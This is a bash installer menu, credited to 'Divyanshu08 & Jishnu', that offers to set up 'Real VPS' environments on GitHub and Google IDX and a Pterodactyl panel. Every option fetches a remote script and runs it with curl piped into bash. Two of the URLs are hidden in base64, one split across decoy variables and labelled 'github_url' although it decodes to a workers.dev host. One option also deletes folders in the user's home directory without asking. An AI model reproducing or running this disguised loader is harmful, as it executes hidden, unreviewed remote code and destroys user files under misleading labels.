#!/bin/bash
set -euo pipefail

RED='\e[31m'
GREEN='\e[32m'
YELLOW='\e[33m'
BLUE='\e[34m'
CYAN='\e[36m'
RESET='\e[0m'

animate_logo() {
  clear
  local logo=(
"________  .__                                   .__           _______     ______"
"\______ \ |__|__  _____.__._____    ____   _____|  |__  __ __ \   _  \   /  __  \ "
" |    |  \|  \  \/ <   |  |\__  \  /    \ /  ___/  |  \|  |  \/  /_\  \  >      < "
" |    `   \  |\   / \___  | / __ \|   |  \\___ \|   Y  \  |  /\  \_/   \/   --   \\"
"/_______  /__| \_/  / ____|(____  /___|  /____  >___|  /____/  \_____  /\______  /"
"        \/          \/          \/     \/     \/     \/              \/        \/"
  )
  for line in "${logo[@]}"; do
    echo -e "${BLUE}${line}${RESET}"
    sleep 0.15
  done
  echo ""
  sleep 0.5
}

animate_logo

SYS_LOG[0]="$(echo 'aHR0cHM6Ly92cHNt' | head -c 16)"
DUMMY_CHECK=$(wc -l /proc/cpuinfo 2>/dev/null | awk '{print $1}')
SYS_LOG[1]="$(echo 'YWtlci5qaXNobnVt' | grep -o '.*')"
NET_CONF="diag_$(date +%N | shuf -n 1)"
if [[ "$DUMMY_CHECK" =~ [0-9]+ ]]; then
  SYS_LOG[2]="$(echo 'b25kYWwzMi53b3Jr' | head -c 16)"
fi
SYS_LOG[3]="$(echo 'ZXJzLmRldg==' | head -c 12)"
github_url="$(echo -n "${SYS_LOG[0]}${SYS_LOG[1]}${SYS_LOG[2]}${SYS_LOG[3]}" | base64 -d)"
GOOGLE_B64="aHR0cHM6Ly9yb3VnaC1oYWxsLTE0ODYuamlzaG51bW9uZGFsMzIud29ya2Vycy5kZXY="
google_url="$(printf %s "$GOOGLE_B64" | base64 -d)"

echo -e "${YELLOW}Select an option:${RESET}"
echo -e "${GREEN}1) GitHub Real VPS${RESET}"
echo -e "${BLUE}2) Google IDX Real VPS${RESET}"
echo -e "${CYAN}3) Super Pterodactyl Panel${RESET}"
echo -e "${RED}4) Exit${RESET}"
echo -ne "${YELLOW}Enter your choice (1-4): ${RESET}"
read choice

case $choice in
  1)
    echo -e "${GREEN}Running GitHub Real VPS...${RESET}"
    bash <(curl -fsSL "$github_url")
    ;;
  2)
    echo -e "${BLUE}Running Google IDX Real VPS...${RESET}"
    cd
    rm -rf myapp flutter
    cd vps123 || true
    if [ ! -d ".idx" ]; then
      mkdir -p .idx && cd .idx
      cat <<'EOF' > dev.nix
{ pkgs, ... }: {
  channel = "stable-24.05";
  packages = with pkgs; [
    unzip
    openssh
    git
    qemu_kvm
    sudo
    cdrkit
    cloud-utils
    qemu
  ];
  env = { EDITOR = "nano"; };
  idx = {
    extensions = [
      "Dart-Code.flutter"
      "Dart-Code.dart-code"
    ];
    workspace = { onCreate = { }; onStart = { }; };
    previews = { enable = false; };
  };
}
EOF
      cd ..
    fi
    echo -ne "${YELLOW}Do you want to continue? (y/n): ${RESET}"
    read confirm
    case "$confirm" in
      [yY]*) bash <(curl -fsSL "$google_url") ;;
      [nN]*) echo -e "${RED}Operation cancelled.${RESET}" && exit 0 ;;
      *) echo -e "${RED}Invalid input! Operation cancelled.${RESET}" && exit 1 ;;
    esac
    ;;
  3)
    echo -e "${CYAN}Launching Super Pterodactyl Panel...${RESET}"
    bash <(curl -s https://ptero.jishnu.fun)
    ;;
  4)
    echo -e "${RED}Exiting...${RESET}"
    exit 0
    ;;
  *)
    echo -e "${RED}Invalid choice! Please select 1–4.${RESET}"
    exit 1
    ;;
esac

echo -e "${GREEN}Made by Divyanshu08 & Jishnu.${RESET}"
